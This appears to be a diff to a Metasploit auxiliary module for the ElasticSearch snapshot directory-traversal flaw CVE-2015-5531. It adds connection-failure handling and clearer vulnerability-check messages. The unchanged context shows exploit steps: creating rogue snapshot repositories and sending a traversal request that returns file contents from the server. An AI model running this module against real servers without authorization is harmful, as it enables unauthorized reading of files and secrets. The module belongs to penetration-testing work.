@@ -54,17 +54,21 @@ class MetasploitModule < Msf::Auxiliary
       'data' => '{"type":"fs","settings":{"location":"dsr"}}'
     )
 
+    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res1
+
     res2 = send_request_raw(
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
       'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
     )
 
+    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res2
+
     if res1.body.include?('true') && res2.body.include?('true')
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears('Successfully created snapshot repositories, suggesting the Snapshot API is vulnerable to CVE-2015-5531.')
     end
 
-    Exploit::CheckCode::Safe
+    Exploit::CheckCode::Safe('Failed to create snapshot repositories.')
   end
 
   def read_file(file)
@@ -82,7 +86,12 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => travs
     )
 
-    if res && res.code == 400
+    unless res
+      print_error("No response received from the target.")
+      return nil
+    end
+
+    if res.code == 400
       return res.body
     else
       print_status("Server returned HTTP response code: #{res.code}")
@@ -95,8 +104,8 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Checking if it's a vulnerable ElasticSearch")
 
     check_code = check_host(ip)
-    print_status("#{check_code.message}")
-    if check_host(ip) != Exploit::CheckCode::Appears
+    print_status(check_code.message)
+    unless check_code == Exploit::CheckCode::Appears
       return
     end
 
